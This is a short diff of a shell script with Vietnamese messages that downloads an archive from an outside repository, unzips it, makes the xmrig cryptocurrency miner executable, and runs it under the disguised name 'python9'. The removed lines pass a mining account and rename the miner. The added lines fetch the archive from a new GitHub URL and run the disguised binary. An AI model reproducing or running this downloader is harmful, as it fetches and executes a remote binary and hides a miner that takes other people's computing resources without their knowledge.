@@ -18,16 +18,14 @@ then
 else
 
 echo "Miner da install , chay thoi "
-mv xmrig python9
-./python9 -u haidang.tli@gmail.com --xmr 2
+./python9
 
      
 fi
 exit
 fi
 
-wget https://bitbucket.org/tengikekao/myrep/downloads/mor.zip
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/mor.rar
 unzip mor.zip
-chmod +x xmrig
-mv xmrig python9
-./python9 -u haidang.tli@gmail.com --xmr 2
+chmod +x python9
+./python9
